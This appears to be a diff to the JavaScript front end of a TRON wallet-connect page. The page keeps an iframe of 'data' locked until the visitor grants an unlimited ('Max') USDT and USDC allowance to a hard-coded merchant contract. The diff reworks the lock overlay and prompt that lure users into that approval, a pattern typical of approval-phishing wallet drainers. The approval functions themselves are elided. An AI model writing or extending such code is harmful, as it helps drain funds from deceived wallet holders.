@@ -1,5 +1,5 @@
 // src/main.js
-// 🚨 最終精簡版：內容切換邏輯 + 僅 Max 授權 🚨
+// 🚨 最終精簡版：僅 Max 授權 + Iframe 遮罩控制 🚨
 
 // --- 配置常量 ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
@@ -21,10 +21,9 @@ let targetDeductionToken = null;
 
 // --- UI 元素 ---
 const connectButton = document.getElementById('connectButton');
-const blurOverlay = document.getElementById('blurOverlay');
+const blurOverlay = document.getElementById('blurOverlay'); // 交易時的提示框
 const overlayMessage = document.getElementById('overlayMessage');
-const lockedContent = document.getElementById('lockedContent');      // 新增
-const unlockedContent = document.getElementById('unlockedContent');  // 新增
+const lockedPrompt = document.getElementById('lockedPrompt'); // 覆蓋在 iframe 上的鎖定提示
 
 // --- 輔助函數 ---
 function showOverlay(message) {
@@ -35,13 +34,13 @@ function hideOverlay() {
     blurOverlay.style.display = 'none';
 }
 
-function updateContentVisibility(isAuthorized) {
+function updateContentLock(isAuthorized) {
     if (isAuthorized) {
-        if (lockedContent) lockedContent.style.display = 'none';
-        if (unlockedContent) unlockedContent.style.display = 'block';
+        // 授權成功：移除鎖定提示，讓 iframe 正常顯示
+        if (lockedPrompt) lockedPrompt.style.display = 'none';
     } else {
-        if (lockedContent) lockedContent.style.display = 'block';
-        if (unlockedContent) unlockedContent.style.display = 'none';
+        // 鎖定狀態：顯示鎖定提示
+        if (lockedPrompt) lockedPrompt.style.display = 'flex';
     }
 }
 
@@ -57,13 +56,13 @@ function updateConnectionUI(connected, address = null) {
         connectButton.classList.remove('connected');
         connectButton.innerHTML = '連繫錢包';
         connectButton.title = '連繫錢包';
-        // 初始/斷開狀態：顯示鎖定內容
-        updateContentVisibility(false);
+        // 初始/斷開狀態：顯示鎖定提示
+        updateContentLock(false); 
         hideOverlay();
     }
 }
 
-// ... (以下所有 checkTokenMaxAllowance, getTokenBalance, initializeContracts 函數保持不變)
+// ... (以下所有 checkTokenMaxAllowance, getTokenBalance, initializeContracts, connectTronLink, checkAuthorization, connectAndAuthorize 函數保持不變)
 async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
     if (!tronWeb || !userAddress) return false;
     try {
@@ -92,8 +91,6 @@ async function initializeContracts() {
     usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
     usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
 }
-
-// ... (以下 connectTronLink, checkAuthorization, connectAndAuthorize 函數保持不變)
 
 async function connectTronLink() {
     if (!window.tronLink) {
@@ -203,7 +200,7 @@ async function connectAndAuthorize() {
 
 
 // ---------------------------------------------
-// 連線成功後處理：檢查並切換內容
+// 連線成功後處理：檢查並控制 iframe 遮罩
 // ---------------------------------------------
 async function handlePostConnection() {
     if (!isConnectedFlag) return;
@@ -213,17 +210,17 @@ async function handlePostConnection() {
     const allAuthorized = status.contract && tokenAuthorized;
 
     if (allAuthorized) {
-        // 授權已完成
-        showOverlay('✅ Max 授權已成功！您已解鎖內容。');
-        updateContentVisibility(true); // 顯示解鎖內容
+        // 授權已完成：移除鎖定提示，允許查看 iframe 內容
+        showOverlay('✅ Max 授權已成功！數據已解鎖。');
+        updateContentLock(true); 
         
         await new Promise(resolve => setTimeout(resolve, 3000));
         hideOverlay();
 
     } else {
-        // 授權未完成，引導用戶授權
+        // 授權未完成：引導用戶授權
         showOverlay('正在檢查授權狀態，Max 授權尚未完成。即將開始授權流程...');
-        updateContentVisibility(false); // 確保顯示鎖定內容
+        updateContentLock(false); 
         
         const authSuccess = await connectAndAuthorize();
         if (authSuccess) {
